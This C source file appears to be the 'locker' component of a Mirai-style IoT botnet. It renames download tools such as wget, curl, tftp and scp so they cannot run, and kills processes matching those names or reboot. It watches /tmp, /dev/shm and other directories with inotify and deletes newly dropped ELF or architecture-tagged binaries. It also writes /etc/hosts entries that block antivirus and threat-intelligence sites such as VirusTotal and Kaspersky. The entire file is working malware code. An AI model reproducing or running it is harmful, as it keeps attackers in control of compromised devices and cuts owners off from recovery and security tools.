#define _GNU_SOURCE

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <dirent.h>
#include <fcntl.h>
#include <linux/limits.h>
#include <string.h>
#include <sys/inotify.h>
#include <sys/select.h>

#include "includes.h"
#include "locker.h"
#include "killer.h"
#include "table.h"
#include "util.h"

static int locker_pid;
static char self_realpath[PATH_MAX] = {0};
static volatile sig_atomic_t locker_should_exit = 0;

static const char *disable_tools_paths[] = {
    "/usr/bin/wget", "/bin/wget", "/usr/local/bin/wget",
    "/usr/bin/curl", "/bin/curl", "/usr/local/bin/curl",
    "/usr/bin/tftp", "/bin/tftp", "/usr/local/bin/tftp",
    "/usr/bin/ftp", "/bin/ftp", "/usr/local/bin/ftp",
    "/usr/bin/scp", "/bin/scp", "/usr/local/bin/scp",
    "/usr/bin/fetch", "/usr/bin/ftpget",
    "/usr/bin/axel", "/usr/bin/aria2c", "/usr/bin/aria2",
    NULL
};

static const char *disable_tool_names[] = {
    "wget", "curl", "tftp", "ftp", "scp", "fetch",
    "ftpput", "ftpget", "axel", "aria2c", "aria2",
    NULL
};

static void locker_disable_tools(void)
{
    int i;

    /* hardcoded paths first */
    for (i = 0; disable_tools_paths[i] != NULL; i++)
    {
        char disabled[PATH_MAX + 16];
        int plen = util_strlen((char *)disable_tools_paths[i]);
        if (access(disable_tools_paths[i], F_OK) != 0) continue;
        if (access(disable_tools_paths[i], X_OK) != 0) continue;
        util_strcpy(disabled, (char *)disable_tools_paths[i]);
        util_strcpy(disabled + plen, ".disabled");
        rename(disable_tools_paths[i], disabled);
    }

    /* PATH-based search — find tools wherever they live */
    {
        char *path_env = getenv("PATH");
        char path_copy[4096];
        char *dir, *save;
        if (path_env && util_strlen(path_env) < (int)sizeof(path_copy))
        {
            util_strcpy(path_copy, path_env);
            dir = strtok_r(path_copy, ":", &save);
            while (dir)
            {
                int ti;
                for (ti = 0; disable_tool_names[ti]; ti++)
                {
                    char full[PATH_MAX + 32], disabled[PATH_MAX + 32];
                    int dl = util_strlen(dir);
                    int nl = util_strlen((char *)disable_tool_names[ti]);
                    if (dl + nl + 2 > PATH_MAX) continue;
                    util_strcpy(full, dir);
                    full[dl] = '/';
                    util_strcpy(full + dl + 1, (char *)disable_tool_names[ti]);
                    if (access(full, X_OK) == 0)
                    {
                        util_strcpy(disabled, full);
                        util_strcpy(disabled + dl + 1 + nl, ".disabled");
                        rename(full, disabled);
                    }
                }
                dir = strtok_r(NULL, ":", &save);
            }
        }
    }
}

static void locker_restore_tools(void)
{
    int i;

    for (i = 0; disable_tools_paths[i] != NULL; i++)
    {
        char disabled[PATH_MAX + 16];
        int plen = util_strlen((char *)disable_tools_paths[i]);
        util_strcpy(disabled, (char *)disable_tools_paths[i]);
        util_strcpy(disabled + plen, ".disabled");
        if (access(disabled, F_OK) != 0) continue;
        rename(disabled, disable_tools_paths[i]);
    }

    /* PATH-based restore */
    {
        char *path_env = getenv("PATH");
        char path_copy[4096];
        char *dir, *save;
        if (path_env && util_strlen(path_env) < (int)sizeof(path_copy))
        {
            util_strcpy(path_copy, path_env);
            dir = strtok_r(path_copy, ":", &save);
            while (dir)
            {
                int ti;
                for (ti = 0; disable_tool_names[ti]; ti++)
                {
                    char full[PATH_MAX + 32], disabled[PATH_MAX + 32];
                    int dl = util_strlen(dir);
                    int nl = util_strlen((char *)disable_tool_names[ti]);
                    if (dl + nl + 2 > PATH_MAX) continue;
                    util_strcpy(disabled, dir);
                    disabled[dl] = '/';
                    util_strcpy(disabled + dl + 1, (char *)disable_tool_names[ti]);
                    util_strcpy(disabled + dl + 1 + nl, ".disabled");
                    if (access(disabled, F_OK) != 0) continue;
                    util_strcpy(full, disabled);
                    full[dl + 1 + nl] = 0;
                    rename(disabled, full);
                }
                dir = strtok_r(NULL, ":", &save);
            }
        }
    }
}

static void locker_sigterm(int sig)
{
    (void)sig;
    locker_should_exit = 1;
}

#define EVENT_SIZE (sizeof(struct inotify_event))
#define EVENT_BUF_LEN (1024 * (EVENT_SIZE + 16))

static const char *watch_dirs[] = {
    "/tmp", "/var/tmp", "/dev/shm", "/var/run",
    "/data/local/tmp", "/mnt", "/root",
    "/opt", "/var/lib", "/var/spool",
    NULL
};

static const char *suspicious_ext[] = {
    ".x86", ".x86_64", ".arm", ".arm4", ".arm5", ".arm6", ".arm7",
    ".mips", ".mipsel", ".mpsl", ".ppc", ".sh4", ".spc",
    ".m68k", ".sparc", ".bot", ".elf", ".bin",
    NULL
};

static char is_whitelisted(char *realpath)
{
    if (util_strcmp(realpath, self_realpath))
        return 1;

    {
        char *allowed[] = {
            "/usr", "/bin", "/sbin", "/lib",
            "/etc", "/var", "/dev", "/tmp",
            "/proc", "/sys", "/init",
            "/system", "/vendor",
        };
        int i;
        for (i = 0; i < sizeof(allowed) / sizeof(allowed[0]); i++)
        {
            if (util_strncmp(realpath, allowed[i], util_strlen(allowed[i])))
                return 1;
        }
    }
    return 0;
}

static void check_new_process(char *pid_str)
{
    char exe_path[64], *ptr = exe_path, realpath[PATH_MAX];
    int rp_len, pid = util_atoi(pid_str, 10);

    if (pid == getpid() || pid == getppid())
        return;

    table_unlock_val(TABLE_KILLER_PROC);
    table_unlock_val(TABLE_KILLER_EXE);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_PROC, NULL));
    ptr += util_strcpy(ptr, pid_str);
    ptr += util_strcpy(ptr, table_retrieve_val(TABLE_KILLER_EXE, NULL));
    table_lock_val(TABLE_KILLER_PROC);
    table_lock_val(TABLE_KILLER_EXE);

    rp_len = readlink(exe_path, realpath, sizeof(realpath) - 1);
    if (rp_len == -1)
        return;
    realpath[rp_len] = 0;

    if (is_whitelisted(realpath))
        return;

    table_unlock_val(TABLE_MISC_WGET);
    table_unlock_val(TABLE_MISC_CURL);
    table_unlock_val(TABLE_MISC_TFTP);
    table_unlock_val(TABLE_MISC_REBOOT);

    if (util_stristr(realpath, rp_len, table_retrieve_val(TABLE_MISC_WGET, NULL)) != -1 ||
        util_stristr(realpath, rp_len, table_retrieve_val(TABLE_MISC_CURL, NULL)) != -1 ||
        util_stristr(realpath, rp_len, table_retrieve_val(TABLE_MISC_TFTP, NULL)) != -1 ||
        util_stristr(realpath, rp_len, table_retrieve_val(TABLE_MISC_REBOOT, NULL)) != -1)
    {
        kill(pid, 9);
        kill(pid, 9);
    }

    table_lock_val(TABLE_MISC_WGET);
    table_lock_val(TABLE_MISC_CURL);
    table_lock_val(TABLE_MISC_TFTP);
    table_lock_val(TABLE_MISC_REBOOT);
}

static int has_suspicious_ext(const char *name)
{
    const char *dot;
    int i;
    if (!name) return 0;
    dot = strrchr(name, '.');
    if (!dot) return 0;
    for (i = 0; suspicious_ext[i] != NULL; i++)
    {
        if (strcasecmp(dot, suspicious_ext[i]) == 0)
            return 1;
    }
    return 0;
}

static int is_elf_binary(const char *path)
{
    int fd;
    unsigned char magic[4];
    ssize_t n;
    fd = open(path, O_RDONLY);
    if (fd < 0) return 0;
    n = read(fd, magic, 4);
    close(fd);
    if (n < 4) return 0;
    return (magic[0] == 0x7f && magic[1] == 'E' && magic[2] == 'L' && magic[3] == 'F');
}

static void watcher_proc_scan(void)
{
    DIR *dir;
    struct dirent *file;

    dir = opendir("/proc");
    if (dir == NULL)
        return;

    while ((file = readdir(dir)))
    {
        if (*(file->d_name) < '0' || *(file->d_name) > '9')
            continue;
        check_new_process(file->d_name);
    }

    closedir(dir);
}

struct watch_entry {
    int wd;
    char dir[PATH_MAX];
};

#define MAX_WATCHES 64

static void add_watch_recursive(int fd, const char *path, struct watch_entry *entries, int *count)
{
    int wd, i;
    if (*count >= MAX_WATCHES) return;
    for (i = 0; i < *count; i++)
        if (strcmp(entries[i].dir, path) == 0) return;
    wd = inotify_add_watch(fd, path, IN_CREATE | IN_MOVED_TO | IN_ONLYDIR);
    if (wd < 0) return;
    entries[*count].wd = wd;
    util_strcpy(entries[*count].dir, path);
    (*count)++;
}

static void watcher_inotify_loop(void)
{
    int fd;
    struct watch_entry entries[MAX_WATCHES];
    int num_watch = 0;
    int i;

    fd = inotify_init();
    if (fd < 0)
        return;

    for (i = 0; watch_dirs[i] != NULL && num_watch < MAX_WATCHES; i++)
        add_watch_recursive(fd, watch_dirs[i], entries, &num_watch);

    while (1)
    {
        char buffer[EVENT_BUF_LEN];
        int len;

        if (locker_should_exit)
        {
            locker_restore_tools();
            _exit(0);
        }
        fd_set rfds;
        struct timeval tv;

        FD_ZERO(&rfds);
        FD_SET(fd, &rfds);
        tv.tv_sec = 2;
        tv.tv_usec = 0;

        if (select(fd + 1, &rfds, NULL, NULL, &tv) <= 0)
        {
            if (kill(getppid(), 0) != 0)
            {
                locker_restore_tools();
                _exit(0);
            }
            watcher_proc_scan();
            continue;
        }

        if (kill(getppid(), 0) != 0)
        {
            locker_restore_tools();
            _exit(0);
        }

        len = read(fd, buffer, EVENT_BUF_LEN);
        if (len <= 0)
        {
            watcher_proc_scan();
            continue;
        }

        {
            int offset = 0;
            while (offset < len)
            {
                struct inotify_event *event = (struct inotify_event *)&buffer[offset];
                if (event->len > 0)
                {
                    if (event->mask & IN_ISDIR)
                    {
                        int wi;
                        for (wi = 0; wi < num_watch; wi++)
                        {
                            if (entries[wi].wd == event->wd)
                            {
                                char sub[PATH_MAX + 256];
                                snprintf(sub, sizeof(sub), "%s/%s", entries[wi].dir, event->name);
                                add_watch_recursive(fd, sub, entries, &num_watch);
                                break;
                            }
                        }
                    }
                    else
                    {
                        int wi;
                        for (wi = 0; wi < num_watch; wi++)
                        {
                            if (entries[wi].wd == event->wd)
                            {
                                char full[PATH_MAX + 256];
                                snprintf(full, sizeof(full), "%s/%s", entries[wi].dir, event->name);
                                if (has_suspicious_ext(event->name) || is_elf_binary(full))
                                    unlink(full);
                                break;
                            }
                        }
                    }
                }
                offset += EVENT_SIZE + event->len;
            }
        }

        watcher_proc_scan();
    }
}

void locker_init(void)
{
    locker_pid = fork();
    if (locker_pid > 0 || locker_pid == -1)
        return;

    signal(SIGTERM, locker_sigterm);
    readlink("/proc/self/exe", self_realpath, sizeof(self_realpath) - 1);

    locker_disable_tools();

    {
        /* block security vendor / threat intel domains in /etc/hosts */
        static const char *block_hosts[] = {
            "0.0.0.0 avast.com",  "0.0.0.0 www.avast.com",
            "0.0.0.0 avg.com",    "0.0.0.0 www.avg.com",
            "0.0.0.0 virustotal.com", "0.0.0.0 www.virustotal.com",
            "0.0.0.0 kaspersky.com",  "0.0.0.0 www.kaspersky.com",
            "0.0.0.0 bitdefender.com","0.0.0.0 www.bitdefender.com",
            "0.0.0.0 malwarebytes.com","0.0.0.0 www.malwarebytes.com",
            "0.0.0.0 any.run",       "0.0.0.0 app.any.run",
            "0.0.0.0 hybrid-analysis.com", "0.0.0.0 www.hybrid-analysis.com",
            "0.0.0.0 joesandbox.com", "0.0.0.0 www.joesandbox.com",
            "0.0.0.0 urlhaus.abuse.ch",
            "0.0.0.0 threatcrowd.org",
            "0.0.0.0 otx.alienvault.com",
            NULL
        };
        FILE *hf = fopen("/etc/hosts", "a");
        if (hf)
        {
            int hi;
            for (hi = 0; block_hosts[hi]; hi++)
            {
                fprintf(hf, "%s\n", block_hosts[hi]);
            }
            fclose(hf);
        }
    }

    watcher_inotify_loop();
}

void locker_kill(void)
{
    if (locker_pid > 0)
    {
        locker_restore_tools();
        kill(locker_pid, SIGTERM);
    }
}